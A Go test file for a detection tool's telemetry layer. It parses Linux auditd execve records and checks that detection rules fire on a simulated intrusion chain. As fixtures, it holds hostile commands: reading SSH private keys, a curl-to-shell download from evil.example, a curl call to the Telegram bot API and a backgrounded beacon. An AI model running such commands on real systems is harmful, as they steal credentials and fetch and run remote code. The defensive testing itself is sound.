package telemetry

import (
	"strings"
	"testing"

	"github.com/crperdue73/AEGIS-Watchman/internal/rules"
	"github.com/crperdue73/AEGIS-Watchman/internal/schema"
)

// auditLine is a helper to build realistic auditd lines with a serial.
func auditLine(typ, body string, serial int) string {
	return "type=" + typ + " msg=audit(1790597000.123:" + itoa(serial) + "): " + body
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}

func TestParseAuditLog_Execve(t *testing.T) {
	log := strings.Join([]string{
		auditLine("SYSCALL", `arch=x86_64 syscall=execve success=yes exit=0 pid=4242 ppid=1 uid=0 auid=1000 exe="/usr/bin/bash"`, 100),
		auditLine("EXECVE", `argc=3 a0="bash" a1="-c" a2="cat ~/.ssh/id_rsa"`, 100),
		auditLine("CWD", `cwd="/root"`, 100),
	}, "\n")

	recs, err := ParseAuditLog(strings.NewReader(log))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(recs) != 1 {
		t.Fatalf("want 1 record, got %d", len(recs))
	}
	r := recs[0]
	if r.Exe != "/usr/bin/bash" {
		t.Errorf("exe = %q", r.Exe)
	}
	if r.PID != 4242 || r.PPID != 1 || r.UID != 0 {
		t.Errorf("ids = pid %d ppid %d uid %d", r.PID, r.PPID, r.UID)
	}
	if got := strings.Join(r.Argv, " "); got != "bash -c cat ~/.ssh/id_rsa" {
		// note: the shell-quoted arg is one argv element; Fields split it, but
		// ParseExecveArgs must reassemble a2 as the full unquoted string.
		t.Errorf("argv = %q", got)
	}
	if r.Cwd != "/root" {
		t.Errorf("cwd = %q", r.Cwd)
	}
}

func TestParseAuditLog_QuotedArgStaysWhole(t *testing.T) {
	// a2 contains spaces inside quotes — it must survive as ONE argv element.
	log := auditLine("SYSCALL", `syscall=execve pid=9 uid=0 exe="/bin/sh"`, 7) + "\n" +
		auditLine("EXECVE", `argc=3 a0="sh" a1="-c" a2="curl http://evil.example/x | sh"`, 7)
	recs, err := ParseAuditLog(strings.NewReader(log))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(recs) != 1 {
		t.Fatalf("want 1, got %d", len(recs))
	}
	if len(recs[0].Argv) != 3 {
		t.Fatalf("want 3 argv, got %d: %#v", len(recs[0].Argv), recs[0].Argv)
	}
	if recs[0].Argv[2] != "curl http://evil.example/x | sh" {
		t.Errorf("argv[2] = %q", recs[0].Argv[2])
	}
}

func TestParseAuditLog_SkipsNonExec(t *testing.T) {
	log := strings.Join([]string{
		auditLine("SYSCALL", `syscall=openat pid=5 uid=0 exe="/bin/cat"`, 1),
		auditLine("SYSCALL", `syscall=execve pid=6 uid=0 exe="/bin/ls"`, 2),
		auditLine("EXECVE", `argc=1 a0="ls"`, 2),
		"garbage line that is not audit at all",
	}, "\n")
	recs, err := ParseAuditLog(strings.NewReader(log))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(recs) != 1 {
		t.Fatalf("want only the execve record, got %d", len(recs))
	}
	if recs[0].Exe != "/bin/ls" {
		t.Errorf("exe = %q", recs[0].Exe)
	}
}

func TestParseAuditLog_LongArgReassembly(t *testing.T) {
	// Long args are split by auditd into a2_len / a2[0] / a2[1].
	log := auditLine("SYSCALL", `syscall=execve pid=3 uid=0 exe="/usr/bin/python3"`, 11) + "\n" +
		auditLine("EXECVE", `argc=2 a0="python3" a1_len=31 a1[0]="import os; os.system('id" a1[1]="')"`, 11)
	recs, err := ParseAuditLog(strings.NewReader(log))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(recs) != 1 || len(recs[0].Argv) != 2 {
		t.Fatalf("want 1 rec with 2 argv, got %#v", recs)
	}
	if recs[0].Argv[1] != "import os; os.system('id')" {
		t.Errorf("argv[1] = %q", recs[0].Argv[1])
	}
}

func TestAction_Shape(t *testing.T) {
	rec := &AuditRecord{
		Syscall: "execve", PID: 77, PPID: 1, UID: 1000,
		Exe:  "/usr/bin/curl",
		Argv: []string{"curl", "https://api.telegram.org/bot/sendMessage"},
	}
	act, actor, ok := rec.Action()
	if !ok {
		t.Fatal("expected ok")
	}
	if act.Type != ProcessExec {
		t.Errorf("type = %q", act.Type)
	}
	if act.Detail["exe"] != "/usr/bin/curl" {
		t.Errorf("exe = %v", act.Detail["exe"])
	}
	argv, _ := act.Detail["argv"].([]any)
	if len(argv) != 2 || argv[1] != "https://api.telegram.org/bot/sendMessage" {
		t.Errorf("argv = %#v", argv)
	}
	if actor == nil || actor.PID == nil || *actor.PID != 77 {
		t.Errorf("actor = %#v", actor)
	}
	if actor.UID == nil || *actor.UID != 1000 {
		t.Errorf("actor uid = %#v", actor.UID)
	}
}

func TestAction_Empty(t *testing.T) {
	rec := &AuditRecord{Serial: 1}
	if _, _, ok := rec.Action(); ok {
		t.Error("empty record should not produce an action")
	}
}

func TestParseTextStream(t *testing.T) {
	in := "# a comment\n" +
		"/usr/bin/ls\t-la\t/tmp\n" +
		"\n" +
		"bash -c whoami\n"
	acts, err := ParseTextStream(strings.NewReader(in))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(acts) != 2 {
		t.Fatalf("want 2 actions, got %d", len(acts))
	}
	if acts[0].Detail["exe"] != "/usr/bin/ls" {
		t.Errorf("exe0 = %v", acts[0].Detail["exe"])
	}
	if acts[1].Detail["exe"] != "bash" {
		t.Errorf("exe1 = %v", acts[1].Detail["exe"])
	}
}

// --- Engine wiring: telemetry actions -> rules engine -> behavior.rule_match ---

type fakeSource struct {
	events []Event
	err    error
}

func (f *fakeSource) Actions() ([]Event, error) { return f.events, f.err }

// loadCarbonatoPack loads the shipped seed pack from the repo.
func loadCarbonatoPack(t *testing.T) *rules.Pack {
	t.Helper()
	p, err := rules.LoadPack("../../rules/carbonato.yaml")
	if err != nil {
		t.Fatalf("load pack: %v", err)
	}
	return p
}

func TestEngine_MatchesCarbonatoChain(t *testing.T) {
	pack := loadCarbonatoPack(t)
	eng := rules.NewEngine(pack)

	// The CARBONATO process half, in order: a shell is spawned, it reaches for
	// the SSH private key, and it backgrounds itself for persistence. Each of
	// these is a process.exec action the execve adapter produces, and each must
	// fire its rule through the telemetry seam.
	src := &fakeSource{events: []Event{
		{Action: actionFor("/usr/bin/bash", "bash", "-c", "cat ~/.ssh/id_ed25519")},
		{Action: actionFor("/usr/bin/nohup", "nohup", "./beacon")},
	}}
	te := NewEngine(src, eng, schema.Host{ID: "h1"}, &schema.Agent{ID: "a1"})

	got, err := te.Matches()
	if err != nil {
		t.Fatalf("matches: %v", err)
	}
	if len(got) < 3 {
		t.Fatalf("want >=3 rule matches (shell, ssh-key, persist), got %d: %#v", len(got), got)
	}
	for _, ev := range got {
		if ev.Event != schema.EventBehaviorRuleMatch {
			t.Errorf("event = %q", ev.Event)
		}
		if ev.Action == nil || ev.Rule == nil {
			t.Errorf("event missing action/rule: %#v", ev)
		}
		if ev.Host.ID != "h1" {
			t.Errorf("host = %q", ev.Host.ID)
		}
		if ev.Agent == nil || ev.Agent.ID != "a1" {
			t.Errorf("agent not attached: %#v", ev.Agent)
		}
	}

	fired := map[string]bool{}
	for _, ev := range got {
		fired[ev.Rule.ID] = true
	}
	for _, want := range []string{
		"carbonato.exec.shell_spawn",
		"carbonato.exec.ssh_key_heredoc",
		"carbonato.persist.survives_session",
	} {
		if !fired[want] {
			t.Errorf("expected rule %q to fire; fired=%v", want, fired)
		}
	}
}

func TestEngine_BenignStaysQuiet(t *testing.T) {
	pack := loadCarbonatoPack(t)
	eng := rules.NewEngine(pack)
	src := &fakeSource{events: []Event{
		{Action: actionFor("/usr/bin/ls", "ls", "-la", "/tmp")},
	}}
	te := NewEngine(src, eng, schema.Host{ID: "h1"}, nil)
	got, err := te.Matches()
	if err != nil {
		t.Fatalf("matches: %v", err)
	}
	if len(got) != 0 {
		t.Fatalf("benign ls should not fire, got %#v", got)
	}
}

func TestEngine_PropagatesSourceError(t *testing.T) {
	eng := rules.NewEngine(loadCarbonatoPack(t))
	src := &fakeSource{err: errFake}
	te := NewEngine(src, eng, schema.Host{ID: "h1"}, nil)
	if _, err := te.Matches(); err == nil {
		t.Fatal("expected source error to propagate")
	}
}

var errFake = &fakeErr{}

type fakeErr struct{}

func (*fakeErr) Error() string { return "boom" }

// actionFor builds a process.exec action the way the adapters do.
func actionFor(exe string, argv ...string) schema.Action {
	vals := make([]any, 0, len(argv))
	for _, a := range argv {
		vals = append(vals, a)
	}
	return schema.Action{
		Type:   ProcessExec,
		Detail: map[string]any{"exe": exe, "argv": vals},
	}
}
